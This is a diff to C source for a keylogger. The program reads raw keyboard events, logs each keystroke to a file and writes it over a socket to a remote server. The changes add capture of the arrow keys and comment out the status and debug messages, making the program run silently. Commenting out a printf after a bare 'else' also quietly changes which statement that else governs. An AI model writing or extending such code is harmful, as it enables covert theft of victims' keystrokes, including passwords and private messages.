@@ -33,7 +33,7 @@ void keylogger(int log_file, int sockfd) {
         int bytes_read = read(fd, &event, sizeof(event));
         if (bytes_read == -1) {
             // For debugging purposes
-            printf("Could not read\n");
+            // printf("Could not read\n");
             return;
         }
         // Check to see if EV_KEY event and that a button was pressed
@@ -72,6 +72,22 @@ void keylogger(int log_file, int sockfd) {
                     write(log_file, "[SHIFT]", strlen("[SHIFT]"));
         write(sockfd, "[SHIFT]", strlen("[SHIFT]"));
         break;
+                case 103:
+                    write(log_file, "[UP]", strlen("[UP]"));
+        write(sockfd, "[UP]", strlen("[UP]"));
+        break;
+                case 105:
+                    write(log_file, "[LEFT]", strlen("[LEFT]"));
+        write(sockfd, "[LEFT]", strlen("[LEFT]"));
+        break;
+                case 106:
+                    write(log_file,"[RIGHT]",strlen("[RIGHT]"));
+        write(sockfd, "[RIGHT]", strlen("[RIGHT]"));
+        break;
+                case 108:
+                    write(log_file, "[DOWN]",strlen("[DOWN]"));
+        write(sockfd,"[DOWN]",strlen("[DOWN]"));
+        break;
                 default:
                   if(event.code <= 53){
                     write(log_file, &keys[event.code], sizeof(char));
@@ -105,7 +121,7 @@ int main() {
         exit(0);
     }
     else
-        printf("Socket successfully created..\n");
+        // printf("Socket successfully created..\n");
     bzero(&servaddr, sizeof(servaddr));
 
     // assign IP, PORT
@@ -119,7 +135,7 @@ int main() {
         exit(0);
     }
     else
-        printf("connected to the server..\n");
+        // printf("connected to the server..\n");
 
     while(1)
     keylogger(fd,sockfd);
